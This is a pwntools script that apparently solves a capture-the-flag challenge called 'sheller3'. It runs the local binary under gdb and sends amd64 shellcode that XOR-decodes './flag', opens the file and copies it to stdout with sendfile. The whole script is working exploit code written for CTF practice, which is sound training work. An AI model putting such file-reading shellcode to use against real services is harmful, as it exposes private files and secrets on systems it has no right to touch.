from pwn import *

context.arch = "amd64"
context.terminal = ["terminator", "-e"]

#p = remote("localhost", 1024)
p = process("./docker/sheller3")
gdb.attach(p, '''
b *main+209
c
''')
input("wait")
payload = asm('''
mov r10, 0x0101010101010101
push r10
mov r10, 0x010166606d672e2f
xor [rsp], r10

and rdi, r14
mov r12, rsp
or rdi, r12
and rax, r14
mov al, 2
and rdx, r14

syscall
mov si, ax
and rdi, r14
inc edi
and edx, r11d
mov r10d, 0xffffffff
and rax, r14
mov al, 40
syscall 
''')
log.info("Sending payload")
print(disasm(payload))
print(len(payload))
p.send(payload)
with open("exploit", "wb") as f:
    f.write(payload)
p.interactive()